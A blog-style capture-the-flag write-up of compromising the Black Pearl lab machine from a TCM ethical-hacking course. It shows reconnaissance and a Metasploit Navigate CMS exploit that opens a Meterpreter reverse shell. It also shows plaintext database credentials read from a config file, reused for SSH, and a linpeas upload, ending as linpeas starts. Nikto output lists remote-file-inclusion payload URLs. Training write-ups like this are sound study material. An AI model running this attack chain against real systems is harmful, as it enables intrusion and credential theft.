---
title: Write-up Black Pearl on TCM
author: eMVee
date: 2022-08-19 21:00:00 +0800
categories: [CTF, TCM]
tags: [PNPT, vhost]
render_with_liquid: false
---

Black Pearl is a vulnerable machine what is part of TCM academy's Practical Ethical Hacking course.
The machine sounds interesting and reminds me of the Black Pearl boat name from The Pirates of the Caribbean.
## PNPT - Black Pearl writeup

At the same time I booted both virtual machines in my pentest labenvironment and I started a ping sweep with **fping** from the Kali machine.
~~~
┌──(emvee㉿kali)-[~]
└─$ fping 192.168.138.0/24 -ag 2>/dev/null
192.168.138.1
192.168.138.2
192.168.138.3
192.168.138.4
192.168.138.7
~~~
As soon as fping is finished I see an IP address that I have not seen before. So this must be Black Pearl. I also start another ping sweep with nmap to see if there are any other IP addresses found.
~~~                            
┌──(emvee㉿kali)-[~]
└─$ nmap -sn -n -T4 192.168.138.0/24    
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 11:23 CEST
Nmap scan report for 192.168.138.1
Host is up (0.0016s latency).
Nmap scan report for 192.168.138.4
Host is up (0.00032s latency).
Nmap scan report for 192.168.138.7
Host is up (0.00063s latency).
Nmap done: 256 IP addresses (3 hosts up) scanned in 2.93 seconds
~~~
Also nmap found the same IP address as my fping command. And because it's possible, I decide to run netdiscover as well. I scanned the network in several ways to see which IP addresses are online.
~~~
┌──(emvee㉿kali)-[~]
└─$ sudo netdiscover -r 192.168.138.0/24

 Currently scanning: Finished!   |   Screen View: Unique Hosts                                                                                                                                                                            
                                                                                                                                                                                                                                          
 4 Captured ARP Req/Rep packets, from 4 hosts.   Total size: 240                                                                                                                                                                          
 _____________________________________________________________________________
   IP            At MAC Address     Count     Len  MAC Vendor / Hostname      
 -----------------------------------------------------------------------------
 192.168.138.1   52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                         
 192.168.138.2   52:54:00:12:35:00      1      60  Unknown vendor                                                                                                                                                                         
 192.168.138.3   08:00:27:cd:5e:1a      1      60  PCS Systemtechnik GmbH                                                                                                                                                                 
 192.168.138.7   08:00:27:ff:39:2d      1      60  PCS Systemtechnik GmbH   
~~~ 
I have now identified the IP address of Black Pearl in 3 different ways, but then I just forget one of my tools that I like to use. With arp-scan I do one last scan.
~~~
┌──(emvee㉿kali)-[~]
└─$ sudo arp-scan --localnet            
Interface: eth0, type: EN10MB, MAC: 08:00:27:c7:ee:60, IPv4: 192.168.138.4
Starting arp-scan 1.9.7 with 256 hosts (https://github.com/royhills/arp-scan)
192.168.138.1   52:54:00:12:35:00       QEMU
192.168.138.2   52:54:00:12:35:00       QEMU
192.168.138.3   08:00:27:cd:5e:1a       PCS Systemtechnik GmbH
192.168.138.7   08:00:27:ff:39:2d       PCS Systemtechnik GmbH

4 packets received by filter, 0 packets dropped by kernel
Ending arp-scan 1.9.7: 256 hosts scanned in 2.217 seconds (115.47 hosts/sec). 4 responded
~~~
I have now identified 192.168.138.7 as the IP address for Black Pearl in four different ways.
I create a variable with the IP address attached so that I can call it in my commands.
~~~
┌──(emvee㉿kali)-[~]
└─$ ip=192.168.138.7  
~~~                     
Once I declare the IP address as a variable I start a quick aggressive nmap scan to see which ports are open and which services are running.
~~~
┌──(emvee㉿kali)-[~]
└─$ sudo nmap -sC -sV -T4 -A -O -p- $ip 
Starting Nmap 7.92 ( https://nmap.org ) at 2022-08-19 11:26 CEST
Nmap scan report for 192.168.138.7
Host is up (0.00047s latency).
Not shown: 65532 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)
| ssh-hostkey: 
|   2048 66:38:14:50:ae:7d:ab:39:72:bf:41:9c:39:25:1a:0f (RSA)
|   256 a6:2e:77:71:c6:49:6f:d5:73:e9:22:7d:8b:1c:a9:c6 (ECDSA)
|_  256 89:0b:73:c1:53:c8:e1:88:5e:c3:16:de:d1:e5:26:0d (ED25519)
53/tcp open  domain  ISC BIND 9.11.5-P4-5.1+deb10u5 (Debian Linux)
| dns-nsid: 
|_  bind.version: 9.11.5-P4-5.1+deb10u5-Debian
80/tcp open  http    nginx 1.14.2
|_http-title: Welcome to nginx!
|_http-server-header: nginx/1.14.2
MAC Address: 08:00:27:FF:39:2D (Oracle VirtualBox virtual NIC)
Device type: general purpose
Running: Linux 4.X|5.X
OS CPE: cpe:/o:linux:linux_kernel:4 cpe:/o:linux:linux_kernel:5
OS details: Linux 4.15 - 5.6
Network Distance: 1 hop
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

TRACEROUTE
HOP RTT     ADDRESS
1   0.47 ms 192.168.138.7

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 18.57 seconds
~~~
As usual, I note the results of the nmap scan below each other so that I can quickly refer to this if I want to double check something.

* Port 22
   * SSH
   * OpenSSH 7.9p1 Debian
* Port 53
   * DNS
   * ISC BIND 9.11.5-P4-5.1+deb10u
* Port 80
   * HTTP webservice
   * nginx 1.14.2
* Debian

There are three ports open with port 53 and port 80 being the most interesting. Port 22 is often an SSH service that is not vulnerable. Still, I always check if I see a banner that gives just a little too much information.
~~~
┌──(emvee㉿kali)-[~]
└─$ ssh $ip                            
The authenticity of host '192.168.138.7 (192.168.138.7)' can't be established.
ED25519 key fingerprint is SHA256:20OvGWVTlVYUa1OZ66+ITgaVeJyCjBYb1M+PlK3w7TY.
This key is not known by any other names
Are you sure you want to continue connecting (yes/no/[fingerprint])? yes 
Warning: Permanently added '192.168.138.7' (ED25519) to the list of known hosts.
emvee@192.168.138.7's password: 
~~~
As expected, the SSH service on port 22 is not the input. An nginx 1.14.2 web service is running on port 80. Time to see what nikto can find in this for me.
~~~
┌──(emvee㉿kali)-[~]
└─$ nikto -h http://$ip             
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.138.7
+ Target Hostname:    192.168.138.7
+ Target Port:        80
+ Start Time:         2022-08-19 11:30:02 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx/1.14.2
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ 7915 requests: 0 error(s) and 3 item(s) reported on remote host
+ End Time:           2022-08-19 11:30:25 (GMT2) (23 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
~~~
Nikto had unfortunately not found any new information. So it was time to use whatweb to find out which techniques are being used.


~~~
┌──(emvee㉿kali)-[~]
└─$ whatweb http://$ip
http://192.168.138.7 [200 OK] Country[RESERVED][ZZ], Email[alek@blackpearl.tcm], HTML5, HTTPServer[nginx/1.14.2], IP[192.168.138.7], Title[Welcome to nginx!], nginx[1.14.2]
~~~
What I noticed immediately is an email address alek@blackpearl.tcm. This in combination with the DNS service on port 53 reminds me of adding blackpearl.tcm to my hosts file. But before I add it to my **/etc/hosts** file, I want to enumerate directories with dirsearch to see if there are any hidden directories that might be of interest.


~~~
┌──(emvee㉿kali)-[~]
└─$ dirsearch -u http://$ip -e php     

  _|. _ _  _  _  _ _|_    v0.4.2                                                                                                                                                                                                           
 (_||| _) (/_(_|| (_| )                                                                                                                                                                                                                    
                                                                                                                                                                                                                                           
Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 8940

Output File: /home/emvee/.dirsearch/reports/192.168.138.7/_22-08-19_11-35-02.txt

Error Log: /home/emvee/.dirsearch/logs/errors-22-08-19_11-35-02.log

Target: http://192.168.138.7/

[11:35:02] Starting: 
[11:35:44] 200 -  209B  - /secret                                           
                                                                             
Task Completed     
~~~
Apparently there is a secret directory. Let's see what's in it with the curl command.
~~~
┌──(emvee㉿kali)-[~]
└─$ curl http://$ip/secret                         
OMG you got r00t !


Just kidding... search somewhere else. Directory busting won't give anything.

<This message is here so that you don't waste more time directory busting this particular website.>

- Alek 

~~~
Nice, a little joke in between that gives us a hint that we don't have to look any further here.
Since I hadn't yet visited the web page itself in the browser, I will do this before I continue.
![Image](/assets/img/WriteUp/PNPT/BlackPearl/1.png){: width="700" height="400" }

As expected, there isn't much to see on the website and it's time to see if there is another virtual host present at the domain name blackpearl.tcm.
With dnsrecon it is possible to check whether a pointer is present. I'm using the command **dnsrecon -r 127.0.0.0/24 -n 192.168.138.7 -d test**. 

The flag **-r** is to indicate a range, the **-n** is to indicate the IP address of the target and the **-d** is for a domain, it does not matter which domain name you enter.
~~~
┌──(emvee㉿kali)-[~]
└─$ dnsrecon -r 127.0.0.0/24 -n 192.168.138.7 -d test
[*] Performing Reverse Lookup from 127.0.0.0 to 127.0.0.255
[+]      PTR blackpearl.tcm 127.0.0.1
[+] 1 Records Found
~~~
A pointer (PTR) is present on the target. Time to add this to my hosts file.
~~~
┌──(emvee㉿kali)-[~]
└─$ sudo nano /etc/hosts
[sudo] password for emvee: 
                                                                                                                                                                                                                                           
┌──(emvee㉿kali)-[~]
└─$ cat /etc/hosts 
127.0.0.1       localhost
127.0.1.1       kali
192.168.138.7   blackpearl.tcm

# The following lines are desirable for IPv6 capable hosts
::1     localhost ip6-localhost ip6-loopback
ff02::1 ip6-allnodes
ff02::2 ip6-allrouters
~~~
Now that the hosts file has been updated, it's time to run another quick scan with nikto.
~~~
┌──(emvee㉿kali)-[~]
└─$ nikto -h http://blackpearl.tcm
- Nikto v2.1.6
---------------------------------------------------------------------------
+ Target IP:          192.168.138.7
+ Target Hostname:    blackpearl.tcm
+ Target Port:        80
+ Start Time:         2022-08-19 11:54:06 (GMT2)
---------------------------------------------------------------------------
+ Server: nginx/1.14.2
+ The anti-clickjacking X-Frame-Options header is not present.
+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS
+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type
+ /: Output from the phpinfo() function was found.
+ /index.php: Output from the phpinfo() function was found.
+ No CGI Directories found (use '-C all' to force check all possible dirs)
+ /./: Output from the phpinfo() function was found.
+ //: Output from the phpinfo() function was found.
+ /%2e/: Output from the phpinfo() function was found.
+ /%2f/: Output from the phpinfo() function was found.
+ ///: Output from the phpinfo() function was found.
+ OSVDB-12184: /?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.
+ OSVDB-3233: /index.php: PHP is installed, and a test script which runs phpinfo() was found. This gives a lot of system information.
+ ///////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////////: Output from the phpinfo() function was found.
+ OSVDB-5292: /?_CONFIG[files][functions_page]=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ OSVDB-5292: /?npage=-1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ OSVDB-5292: /?npage=1&content_dir=http://cirt.net/rfiinc.txt?%00&cmd=ls: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/


< --- SNIP --- >

+ OSVDB-5292: /index.php?url=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ OSVDB-5292: /index.php?w=http://cirt.net/rfiinc.txt?: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ OSVDB-5292: /index.php?way=http://cirt.net/rfiinc.txt???????????????: RFI from RSnake's list (http://ha.ckers.org/weird/rfi-locations.dat) or from http://osvdb.org/
+ 7785 requests: 0 error(s) and 135 item(s) reported on remote host
+ End Time:           2022-08-19 11:54:45 (GMT2) (39 seconds)
---------------------------------------------------------------------------
+ 1 host(s) tested
~~~
In Nikto's results I saw a phpinfo webpage. So of course I want to check it out in the browser.
![Image](/assets/img/WriteUp/PNPT/BlackPearl/2.png){: width="700" height="400" }

If a phpinfo page can still be seen somewhere on a website, this must be a finding in a pentest report immediately.
This information shows, among other things, which architecture is used, which distro, but also other important settings can be discovered. Of course a directory enumeration cannot be missing and I start the dirsearch command to see which directories there are on blackpearl.tcm.

~~~
┌──(emvee㉿kali)-[~]
└─$ dirsearch -u http://blackpearl.tcm -e php        

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )
                                                                                                                                                                                                           
Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 8940

Output File: /home/emvee/.dirsearch/reports/blackpearl.tcm/_22-08-19_11-55-41.txt

Error Log: /home/emvee/.dirsearch/logs/errors-22-08-19_11-55-41.log

Target: http://blackpearl.tcm/

[11:55:41] Starting: 
[11:55:42] 403 -  571B  - /.ht_wsr.txt                                     
[11:55:42] 403 -  571B  - /.htaccess.bak1
[11:55:42] 403 -  571B  - /.htaccess.orig
[11:55:42] 403 -  571B  - /.htaccess.sample
[11:55:42] 403 -  571B  - /.htaccess_orig
[11:55:42] 403 -  571B  - /.htaccessBAK
[11:55:42] 403 -  571B  - /.htaccessOLD2
[11:55:42] 403 -  571B  - /.htaccess_extra
[11:55:42] 403 -  571B  - /.htaccess_sc
[11:55:42] 403 -  571B  - /.htaccess.save
[11:55:42] 403 -  571B  - /.htaccessOLD
[11:55:42] 403 -  571B  - /.html                                           
[11:55:42] 403 -  571B  - /.htm
[11:55:42] 403 -  571B  - /.htpasswd_test                                  
[11:55:42] 403 -  571B  - /.httr-oauth
[11:55:42] 403 -  571B  - /.htpasswds                                      
[11:55:48] 403 -  571B  - /admin/.htaccess                                  
[11:55:50] 403 -  571B  - /administrator/.htaccess                          
[11:55:51] 403 -  571B  - /app/.htaccess                                    
[11:55:54] 200 -  361B  - /crossdomain.xml                                  
[11:56:04] 200 -   85KB - /index.php                                        
                                                                             
Task Completed  
~~~
Dirsearch showed a crossdomain.xml file. This could be interesting as an attacker. I just didn't expect this in this environment. Still, I decide to take a look at the file with curl.

~~~
┌──(emvee㉿kali)-[~]
└─$ curl http://blackpearl.tcm/crossdomain.xml          
<?xml version="1.0"?>
<!DOCTYPE cross-domain-policy SYSTEM "http://www.adobe.com/xml/dtds/cross-domain-policy.dtd">
<cross-domain-policy>
    <allow-access-from domain="pixlr.com" />
    <site-control permitted-cross-domain-policies="master-only"/>
    <allow-http-request-headers-from domain="pixlr.com" headers="*" secure="true"/>
</cross-domain-policy> 
~~~
As expected, this is a crossdomain.xml file that may be of interest, but not for now. I decide to run dirsearch again, but with a different wordlist to find directories. A good start is to grab a medium list.
~~~
┌──(emvee㉿kali)-[~]
└─$ dirsearch -u http://blackpearl.tcm -e php -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt 

  _|. _ _  _  _  _ _|_    v0.4.2
 (_||| _) (/_(_|| (_| )
                                                                                                                                                                                                                                           
Extensions: php | HTTP method: GET | Threads: 30 | Wordlist size: 220545

Output File: /home/emvee/.dirsearch/reports/blackpearl.tcm/_22-08-19_11-58-45.txt

Error Log: /home/emvee/.dirsearch/logs/errors-22-08-19_11-58-45.log

Target: http://blackpearl.tcm/

[11:58:45] Starting: 
[11:58:58] 301 -  185B  - /navigate  ->  http://blackpearl.tcm/navigate/   

~~~
Another directory (navigate) was found using dirsearch and the medium wordlist.
This might be something I'd like to take a look at with the browser.
![Image](/assets/img/WriteUp/PNPT/BlackPearl/3.png){: width="700" height="400" }

It appears that Navigate CMS version 2.8 is in use on this machine. I've never looked at this CMS before and I decide to do a search for navigate with searchsploit is to see if there is an existing exploit.
~~~
┌──(emvee㉿kali)-[~]
└─$ searchsploit navigate               
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                            |  Path
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Adobe Flash Player 7.0.x/8.0.x/9.0.x - ActiveX Control 'navigateToURL' API Cross Domain Scripting                                                                                                         | linux/remote/30907.txt
Microsoft Internet Explorer 4/5/5.5/5.0.1 - external.NavigateAndFind() Cross-Frame                                                                                                                        | multiple/remote/19686.txt
Microsoft Internet Explorer 5 - NavigateAndFind() Cross-Zone Policy (MS04-004)                                                                                                                            | windows/remote/23643.txt
Navigate CMS - (Unauthenticated) Remote Code Execution (Metasploit)                                                                                                                                       | php/remote/45561.rb
Navigate CMS 2.8 - Cross-Site Scripting                                                                                                                                                                   | php/webapps/45445.txt
Navigate CMS 2.8.5 - Arbitrary File Download                                                                                                                                                              | php/webapps/45615.txt
Navigate CMS 2.8.7 - ''sidx' SQL Injection (Authenticated)                                                                                                                                                | php/webapps/48545.py
Navigate CMS 2.8.7 - Authenticated Directory Traversal                                                                                                                                                    | php/webapps/48550.txt
Navigate CMS 2.8.7 - Cross-Site Request Forgery (Add Admin)                                                                                                                                               | php/webapps/48548.txt
Navigate CMS 2.9.4 - Server-Side Request Forgery (SSRF) (Authenticated)                                                                                                                                   | php/webapps/50921.py
Zenturi ProgramChecker - 'ActiveX NavigateUrl()' Insecure Method                                                                                                                                          | windows/remote/4050.html
---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
Papers: No Results
~~~
A number of known exploits have been found and one of them is a remote code execution via metasploit and it is on a version 2.8… This sounds like music to my ears. I decide to start metasploit with silent mode and then I search for the exploit for navigate.
~~~
┌──(emvee㉿kali)-[~]
└─$ msfconsole -q   



msf6 > search navigate

Matching Modules
================

   #  Name                                         Disclosure Date  Rank       Check  Description
   -  ----                                         ---------------  ----       -----  -----------
   0  exploit/multi/browser/firefox_svg_plugin     2013-01-08       excellent  No     Firefox 17.0.1 Flash Privileged Code Injection
   1  exploit/windows/misc/hta_server              2016-10-06       manual     No     HTA Web Server
   2  auxiliary/gather/safari_file_url_navigation  2014-01-16       normal     No     Mac OS X Safari file:// Redirection Sandbox Escape
   3  exploit/multi/http/navigate_cms_rce          2018-09-26       excellent  Yes    Navigate CMS Unauthenticated Remote Code Execution


Interact with a module by name or index. For example info 3, use 3 or use exploit/multi/http/navigate_cms_rce
~~~
The exploit has been found and all I have to do now is indicate that I want to use exploit number 3.

~~~
msf6 > use 3
[*] No payload configured, defaulting to php/meterpreter/reverse_tcp
msf6 exploit(multi/http/navigate_cms_rce) > info

       Name: Navigate CMS Unauthenticated Remote Code Execution
     Module: exploit/multi/http/navigate_cms_rce
   Platform: PHP
       Arch: php
 Privileged: No
    License: Metasploit Framework License (BSD)
       Rank: Excellent
  Disclosed: 2018-09-26

Provided by:
  Pyriphlegethon

Available targets:
  Id  Name
  --  ----
  0   Automatic

Check supported:
  Yes

Basic options:
  Name       Current Setting  Required  Description
  ----       ---------------  --------  -----------
  Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
  RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
  RPORT      80               yes       The target port (TCP)
  SSL        false            no        Negotiate SSL/TLS for outgoing connections
  TARGETURI  /navigate/       yes       Base Navigate CMS directory path
  VHOST                       no        HTTP server virtual host

Payload information:

Description:
  This module exploits insufficient sanitization in the 
  database::protect method, of Navigate CMS versions 2.8 and prior, to 
  bypass authentication. The module then uses a path traversal 
  vulnerability in navigate_upload.php that allows authenticated users 
  to upload PHP files to arbitrary locations. Together these 
  vulnerabilities allow an unauthenticated attacker to execute 
  arbitrary PHP code remotely. This module was tested against Navigate 
  CMS 2.8.

References:
  https://nvd.nist.gov/vuln/detail/CVE-2018-17552
  https://nvd.nist.gov/vuln/detail/CVE-2018-17553
~~~
The exploit is selected and now I would like to see which options can be configured.

~~~
msf6 exploit(multi/http/navigate_cms_rce) > show options

Module options (exploit/multi/http/navigate_cms_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS                      yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /navigate/       yes       Base Navigate CMS directory path
   VHOST                       no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.138.4    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic
~~~
Not many things need to be configured. First I put the RHOSTS to the IP address of Black Pearl.
~~~
msf6 exploit(multi/http/navigate_cms_rce) > set RHOSTS 192.168.138.7
RHOSTS => 192.168.138.7
~~~
Then I specify the VHOST, because multiple websites are active on the IP address and the target cannot be found otherwise.
~~~
msf6 exploit(multi/http/navigate_cms_rce) > set VHOST blackpearl.tcm
VHOST => blackpearl.tcm
~~~
I'll check the options one more time just to be sure before continuing.
~~~
msf6 exploit(multi/http/navigate_cms_rce) > show options

Module options (exploit/multi/http/navigate_cms_rce):

   Name       Current Setting  Required  Description
   ----       ---------------  --------  -----------
   Proxies                     no        A proxy chain of format type:host:port[,type:host:port][...]
   RHOSTS     192.168.138.7    yes       The target host(s), see https://github.com/rapid7/metasploit-framework/wiki/Using-Metasploit
   RPORT      80               yes       The target port (TCP)
   SSL        false            no        Negotiate SSL/TLS for outgoing connections
   TARGETURI  /navigate/       yes       Base Navigate CMS directory path
   VHOST      blackpearl.tcm   no        HTTP server virtual host


Payload options (php/meterpreter/reverse_tcp):

   Name   Current Setting  Required  Description
   ----   ---------------  --------  -----------
   LHOST  192.168.138.4    yes       The listen address (an interface may be specified)
   LPORT  4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Automatic

~~~
Everything seems to be filled in correctly, now I can start the exploit with the command **run**.
~~~
msf6 exploit(multi/http/navigate_cms_rce) > run

[*] Started reverse TCP handler on 192.168.138.4:4444 
[+] Login bypass successful
[+] Upload successful
[*] Triggering payload...
[*] Sending stage (39927 bytes) to 192.168.138.7
[*] Meterpreter session 1 opened (192.168.138.4:4444 -> 192.168.138.7:57390) at 2022-08-19 12:12:13 +0200

meterpreter > sysinfo
Computer    : blackpearl
OS          : Linux blackpearl 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64
Meterpreter : php/linux
meterpreter > 
~~~
The exploit worked and I can run the **sysinfo** command and get the system information. Time to pop a shell, where I immediately see who I am, what membership I have in groups, what working directory I have and what files are present.
~~~
meterpreter > shell
Process 1021 created.
Channel 1 created.
whoami
www-data
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
pwd
/var/www/blackpearl.tcm/navigate
ls
LICENSE.txt
README
cache
cfg
crossdomain.xml
css
favicon.ico
img
index.php
js
lib
login.php
navigate.php
navigate_download.php
navigate_info.php
navigate_upload.php
plugins
private
themes
updates
web
~~~
The **cfg** directory what I would like to keep in mind. This often contains files with usernames and passwords. These could in some cases be reused or accessed elsewhere in the system. Next I want to check in the **/etc/passwd** which users are present on the system and can start a shell.
~~~
cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
sys:x:3:3:sys:/dev:/usr/sbin/nologin
sync:x:4:65534:sync:/bin:/bin/sync
games:x:5:60:games:/usr/games:/usr/sbin/nologin
man:x:6:12:man:/var/cache/man:/usr/sbin/nologin
lp:x:7:7:lp:/var/spool/lpd:/usr/sbin/nologin
mail:x:8:8:mail:/var/mail:/usr/sbin/nologin
news:x:9:9:news:/var/spool/news:/usr/sbin/nologin
uucp:x:10:10:uucp:/var/spool/uucp:/usr/sbin/nologin
proxy:x:13:13:proxy:/bin:/usr/sbin/nologin
www-data:x:33:33:www-data:/var/www:/usr/sbin/nologin
backup:x:34:34:backup:/var/backups:/usr/sbin/nologin
list:x:38:38:Mailing List Manager:/var/list:/usr/sbin/nologin
irc:x:39:39:ircd:/var/run/ircd:/usr/sbin/nologin
gnats:x:41:41:Gnats Bug-Reporting System (admin):/var/lib/gnats:/usr/sbin/nologin
nobody:x:65534:65534:nobody:/nonexistent:/usr/sbin/nologin
_apt:x:100:65534::/nonexistent:/usr/sbin/nologin
systemd-timesync:x:101:102:systemd Time Synchronization,,,:/run/systemd:/usr/sbin/nologin
systemd-network:x:102:103:systemd Network Management,,,:/run/systemd:/usr/sbin/nologin
systemd-resolve:x:103:104:systemd Resolver,,,:/run/systemd:/usr/sbin/nologin
messagebus:x:104:110::/nonexistent:/usr/sbin/nologin
sshd:x:105:65534::/run/sshd:/usr/sbin/nologin
alek:x:1000:1000:alek,,,:/home/alek:/bin/bash
systemd-coredump:x:999:999:systemd Core Dumper:/:/usr/sbin/nologin
mysql:x:106:112:MySQL Server,,,:/nonexistent:/bin/false
bind:x:107:113::/var/cache/bind:/usr/sbin/nologin
~~~
I can see Alek is a user on the system. Of course it is then interesting to see which files are in the home directory. So to see which files are present in the home directory I use the command **ls /home -ahlR**
~~~
ls /home -ahlR
/home:
total 12K
drwxr-xr-x  3 root root 4.0K May 30  2021 .
drwxr-xr-x 18 root root 4.0K May 30  2021 ..
drwxr-xr-x  2 alek alek 4.0K May 30  2021 alek

/home/alek:
total 24K
drwxr-xr-x 2 alek alek 4.0K May 30  2021 .
drwxr-xr-x 3 root root 4.0K May 30  2021 ..
-rw------- 1 alek alek    1 Jun 28  2021 .bash_history
-rw-r--r-- 1 alek alek  220 May 30  2021 .bash_logout
-rw-r--r-- 1 alek alek 3.5K May 30  2021 .bashrc
-rw-r--r-- 1 alek alek  807 May 30  2021 .profile
~~~
Unfortunately there are not really interesting things in his home directory. Perhaps it has additional rights that I can use to take over the system.
I decide to check out the **cfg** folder

~~~
cd cfg
ls
common.php
globals.php
session.php
~~~
There is a globals.php file that pops out first. User names and passwords can be stored here for the web application. I decide to inspect the file.
~~~
cat globals.php
<?php
/* NAVIGATE */
/* Globals configuration file */

/* App installation details */
define('APP_NAME', 'Navigate CMS');
define('APP_VERSION', '2.8 r1302');
define('APP_OWNER', "blackpearl");
define('APP_REALM', "NaviWebs-NaviGate"); // used for password encryption, do not change!
define('APP_UNIQUE', "nv_d1b59e348060b3d5b17fff89.68796804"); // unique id for this installation
define('APP_DEBUG', false || isset($_REQUEST['debug']));
define('APP_FAILSAFE', false);

/* App installation paths */
define('NAVIGATE_PARENT', '//blackpearl.tcm');  // absolute URL to folder which contains the navigate folder (protocol agnostic and without final slash) [example: '//www.domain.com']
define('NAVIGATE_FOLDER', "/navigate"); // name of the navigate folder (default: /navigate)
define('NAVIGATE_PATH', "/var/www/blackpearl.tcm/navigate"); // absolute system path to navigate folder

define('NAVIGATE_PRIVATE', "/var/www/blackpearl.tcm/navigate/private");
define('NAVIGATE_MAIN', "navigate.php");
define('NAVIGATE_DOWNLOAD', NAVIGATE_PARENT.NAVIGATE_FOLDER.'/navigate_download.php');

define('NAVIGATECMS_STATS', false);
define('NAVIGATECMS_UPDATES', false);

/* Optional Utility Paths */
define('JAVA_RUNTIME', '"{JAVA_RUNTIME}"');

/* Database connection */
define('PDO_HOSTNAME', "localhost");
define('PDO_PORT',     "3306");
define('PDO_SOCKET',   "");
define('PDO_DATABASE', "navigate");
define('PDO_USERNAME', "alek");
define('PDO_PASSWORD', "H4x0r");
define('PDO_DRIVER',   "mysql");

ini_set('magic_quotes_runtime', false);
mb_internal_encoding("UTF-8");  /* Set internal character encoding to UTF-8 */

ini_set('display_errors', false);
if(APP_DEBUG)
{
    ini_set('display_errors', true);
    ini_set('display_startup_errors', true);
}

?>
~~~
And of course I discovered a username and password. I had already seen the username in the **/etc/passwd**. So possibly the password was reused by Alek.
I remember that there is an SSH service open on port 22...maybe I can log in to it with username **alek** and password **H4x0r**. If this doesn't work, I can always see if I can log into the mysql database at a later time. First I want to login to Black Pearl via SSH as Alek.
~~~
┌──(emvee㉿kali)-[~]
└─$ ssh alek@$ip                       
alek@192.168.138.7's password: 
Linux blackpearl 4.19.0-16-amd64 #1 SMP Debian 4.19.181-1 (2021-03-19) x86_64

The programs included with the Debian GNU/Linux system are free software;
the exact distribution terms for each program are described in the
individual files in /usr/share/doc/*/copyright.

Debian GNU/Linux comes with ABSOLUTELY NO WARRANTY, to the extent
permitted by applicable law.
alek@blackpearl:~$ 
~~~
So the login was successful and now it's time to see how I become root from the user Alek.
To identify enumerate the machine I love to tun linpeas.sh or linenum.sh on the target.
Uploading the file to the target could be done by using the upload functionality within metasploit.
~~~
meterpreter > upload ~/transfer/linpeas.sh
[*] uploading  : /home/emvee/transfer/linpeas.sh -> linpeas.sh
[*] Uploaded -1.00 B of 788.25 KiB (0.0%): /home/emvee/transfer/linpeas.sh -> linpeas.sh
[*] uploaded   : /home/emvee/transfer/linpeas.sh -> linpeas.sh
~~~
After uploading the file to tha target I have to move the file to a writable direcotry so I could adjust the permissions.

~~~
alek@blackpearl:/tmp$ cd /var/www/blackpearl.tcm/navigate/
alek@blackpearl:/var/www/blackpearl.tcm/navigate$ ls
cache  cfg  crossdomain.xml  css  favicon.ico  img  index.php  js  lib  LICENSE.txt  linpeas.sh  login.php  navigate_download.php  navigate_info.php  navigate.php  navigate_upload.php  plugins  private  README  themes  updates  web
alek@blackpearl:/var/www/blackpearl.tcm/navigate$ cp linpeas.sh /tmp/linpeas.sh
alek@blackpearl:/var/www/blackpearl.tcm/navigate$ cd /tmp/
alek@blackpearl:/tmp$ chmos +x linpeas.sh
-bash: chmos: command not found
alek@blackpearl:/tmp$ chmod +x linpeas.sh
~~~
After setting the right permission to execute I started linpeas to enumerate a lot of information.

~~~
alek@blackpearl:/tmp$ ./linpeas.sh


